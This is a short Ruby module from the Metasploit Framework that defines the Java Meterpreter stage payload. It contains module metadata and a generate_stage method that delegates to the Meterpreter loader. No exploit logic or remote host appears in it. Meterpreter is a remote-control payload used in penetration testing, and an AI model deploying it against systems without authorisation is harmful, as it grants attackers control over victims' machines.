##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/java'
require 'msf/core/payload/java/meterpreter_loader'
require 'msf/base/sessions/meterpreter_java'
require 'msf/base/sessions/meterpreter_options'


module MetasploitModule

  include Msf::Payload::Java::MeterpreterLoader
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Java Meterpreter',
      'Description'   => 'Run a meterpreter server in Java',
      'Author'        => ['mihi', 'egypt', 'OJ Reeves'],
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'PayloadCompat' => {'Convention' => 'javasocket javaurl'},
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Java_Java
    ))
  end

  def generate_stage(opts={})
    stage_payload(opts)
  end
end
